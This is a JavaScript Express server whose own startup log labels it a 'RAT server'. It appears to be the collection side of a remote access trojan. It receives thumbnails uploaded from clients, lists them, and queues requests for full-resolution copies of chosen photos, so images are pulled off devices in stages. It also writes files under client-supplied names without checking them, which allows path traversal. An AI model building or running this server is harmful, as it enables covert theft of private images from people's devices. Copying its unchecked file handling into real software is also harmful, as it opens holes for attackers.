const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const app = express();
const port = 5000;

// ─── Middleware ─────────────────────────────────────────────────────

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true }));

// ─── Directories ────────────────────────────────────────────────────

const uploadDir = './uploads';
const fullResDir = './full_res';

if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });
if (!fs.existsSync(fullResDir)) fs.mkdirSync(fullResDir, { recursive: true });

app.use('/uploads', express.static(uploadDir));
app.use('/full_res', express.static(fullResDir));

// ─── Request queue (in-memory + file persistence) ───────────────────

const requestsFile = path.join(uploadDir, 'requests.json');
let pendingRequests = [];

if (fs.existsSync(requestsFile)) {
    try {
        pendingRequests = JSON.parse(fs.readFileSync(requestsFile, 'utf8'));
    } catch (e) {
        pendingRequests = [];
    }
}

function saveRequests() {
    fs.writeFileSync(requestsFile, JSON.stringify(pendingRequests, null, 2));
}

// ─── API: Thumbnail upload ──────────────────────────────────────────

app.post('/api/upload/thumbnail', (req, res) => {
    try {
        const { filename, thumbnail } = req.body;
        const thumbnailData = thumbnail.split(',')[1] || thumbnail;
        const buffer = Buffer.from(thumbnailData, 'base64');

        const thumbPath = path.join(uploadDir, filename + '_thumb.jpg');
        fs.writeFileSync(thumbPath, buffer);

        const metaPath = path.join(uploadDir, filename + '.metadata.json');
        fs.writeFileSync(metaPath, JSON.stringify({
            originalName: filename,
            thumbnailPath: filename + '_thumb.jpg',
            uploadedAt: new Date().toISOString()
        }, null, 2));

        // console.log('📸 Thumbnail received:', filename);
        res.json({ success: true, filename });
    } catch (error) {
        console.error('Error uploading thumbnail:', error);
        res.status(500).json({ success: false, error: 'Failed to upload thumbnail' });
    }
});

// ─── API: Full-res image upload ─────────────────────────────────────

app.post('/api/upload/fullsize', (req, res) => {
    try {
        const { filename, image } = req.body;
        const imageData = image.split(',')[1] || image;
        const buffer = Buffer.from(imageData, 'base64');

        const fullPath = path.join(fullResDir, filename);
        fs.writeFileSync(fullPath, buffer);

        console.log('🖼️  Full-res saved to ./full_res/' + filename + ' (' + Math.round(buffer.length / 1024) + ' KB)');
        res.json({ success: true, filename });
    } catch (error) {
        console.error('Error uploading full image:', error);
        res.status(500).json({ success: false, error: 'Failed to upload full image' });
    }
});

// ─── API: Thumbnail listing ─────────────────────────────────────────

app.get('/api/thumbnails', (req, res) => {
    try {
        const files = fs.readdirSync(uploadDir);
        const thumbnails = [];

        files.forEach(file => {
            if (file.endsWith('_thumb.jpg')) {
                const metaFile = file.replace('_thumb.jpg', '.metadata.json');
                let metadata = { originalName: file.replace('_thumb.jpg', '') };

                try {
                    metadata = JSON.parse(
                        fs.readFileSync(path.join(uploadDir, metaFile), 'utf8'));
                } catch (e) {}

                const hasFullRes = fs.existsSync(
                    path.join(fullResDir, metadata.originalName));
                const isPending = pendingRequests.includes(metadata.originalName);

                thumbnails.push({
                    name: metadata.originalName,
                    thumbnail: file,
                    uploadedAt: metadata.uploadedAt,
                    hasFullRes,
                    isPending
                });
            }
        });

        thumbnails.sort((a, b) => new Date(b.uploadedAt) - new Date(a.uploadedAt));
        res.json({ thumbnails });
    } catch (error) {
        res.status(500).json({ success: false, error: 'Failed to fetch thumbnails' });
    }
});

// ─── API: Request queue ─────────────────────────────────────────────

app.get('/api/requests', (req, res) => {
    res.json({ requests: pendingRequests });
});

app.post('/api/request/:filename', (req, res) => {
    const filename = decodeURIComponent(req.params.filename);
    if (!pendingRequests.includes(filename)) {
        pendingRequests.push(filename);
        saveRequests();
        console.log('📋 Full-res requested:', filename);
    }
    res.json({ success: true, pending: pendingRequests.length });
});

app.delete('/api/request/:filename', (req, res) => {
    const filename = decodeURIComponent(req.params.filename);
    pendingRequests = pendingRequests.filter(f => f !== filename);
    saveRequests();
    res.json({ success: true });
});

// ─── Dashboard (static files from ./web_ui) ────────────────────────

app.use(express.static(path.join(__dirname, 'web_ui')));


// ─── Server startup ─────────────────────────────────────────────────

app.listen(port, '0.0.0.0', () => {
    console.log('🐀 RAT server running at http://localhost:' + port);
});

process.on('SIGINT', () => {
    console.log('Shutting down server...');
    process.exit(0);
});
